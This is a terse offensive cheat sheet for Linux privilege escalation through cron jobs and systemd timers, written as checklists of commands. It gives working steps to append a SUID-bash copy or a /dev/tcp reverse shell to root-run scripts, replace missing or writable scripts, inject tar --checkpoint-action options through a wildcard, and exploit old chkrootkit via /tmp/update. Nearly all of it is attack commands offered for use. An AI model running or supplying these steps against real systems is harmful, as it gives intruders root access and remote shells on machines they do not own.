# Linux privesc: cron and timers

## Find the jobs
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
crontab -l
ls -la /var/spool/cron/crontabs 2>/dev/null
systemctl list-timers --all
- [ ] For each job root runs: can I write the script, or its folder, and does it use a * or call a program by bare name

## Jobs no file shows me: pspy
At the pwn-broker prompt:
tool install pspy
serve
serve files pspy
On the target, in /dev/shm, the line serve files gives for pspy64, then:
chmod +x pspy64
./pspy64 -pf -i 1000
- [ ] Watched for at least two minutes, and longer for a job every five
- [ ] UID=0 lines: the full command root runs, and how often
- [ ] A program called by bare name, or a Python script whose imports I can replace: :Pb path-hijack

## A script I can write
THE-SCRIPT-PATH is the script the job runs.
ls -la THE-SCRIPT-PATH
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> THE-SCRIPT-PATH
Or a shell, with rlwrap nc -lvnp <LPORT> on Kali:
echo "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" >> THE-SCRIPT-PATH
After the next run:
/tmp/rootbash -p
- [ ] The script ends in exit: my line goes above it, not after
- [ ] No root from -p: /tmp is mounted nosuid, so the copy goes to /var/tmp instead

## A folder I can write, or a script that is missing
mv THE-SCRIPT-PATH /dev/shm/script.bak
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' > THE-SCRIPT-PATH
chmod +x THE-SCRIPT-PATH
- [ ] A job that calls a script that does not exist, in a folder I can write: the same, without the mv

## A wildcard in root's command
For a job such as cd THE-FOLDER && tar -cf /var/backups/backup.tar *, with THE-FOLDER mine to write:
cd THE-FOLDER
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' > pe.sh
chmod +x pe.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pe.sh'
After the next run:
/tmp/rootbash -p
- [ ] The files go in the folder where the * expands, not where the archive is written
- [ ] rsync, chown, chmod and 7z run on a * have option tricks of their own

## systemd timers
THE-UNIT is the timer's name, from list-timers, without .timer:
systemctl cat THE-UNIT.timer
systemctl cat THE-UNIT.service
- [ ] ExecStart runs a program I can write, or one in a folder I can write: changed as for cron
- [ ] PrivateTmp=yes in the service: its /tmp is not mine, so a reverse shell instead of a copy in /tmp

## A program root runs with a known hole
dpkg -l | grep chkrootkit
chkrootkit before 0.50 runs /tmp/update as root:
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' > /tmp/update
chmod +x /tmp/update
- [ ] Every other program root runs, from pspy, checked with searchsploit and its version

## Afterwards
rm -f /tmp/rootbash /tmp/update
- [ ] My lines out of the script, and a moved script put back
